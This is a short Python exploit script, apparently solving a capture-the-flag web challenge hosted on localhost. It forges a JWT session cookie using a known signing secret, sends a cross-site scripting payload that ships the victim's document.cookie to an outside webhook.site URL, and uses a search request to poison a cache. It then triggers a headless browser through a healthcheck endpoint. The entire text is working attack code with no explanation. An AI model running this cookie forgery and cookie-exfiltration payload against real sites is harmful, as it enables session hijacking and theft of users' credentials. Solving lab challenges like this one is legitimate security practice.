```python
import requests, jwt, time
import urllib.parse

URL = "http://localhost:5005"
webhook = "https://webhook.site/ae697493-f501-4c6b-9b72-aeffae37fd70"

session = requests.Session()

# cookie forgery, since we know the secret key
cookie = jwt.encode({"id": 0, "iat": int(time.time())}, "super-secret-key", algorithm="HS256")
print(f"Forged cookie: {cookie}")

session.cookies.set("session", cookie)

payload = f"<script> window.location.href = '{webhook}?cookie=' + document.cookie; </script>"
encoded_payload = urllib.parse.quote(payload)

# poison the cache
session.get(f"{URL}/search?q={encoded_payload}")

# trigger the headless browser
print(session.get(f"{URL}/api/healthcheck").text)
```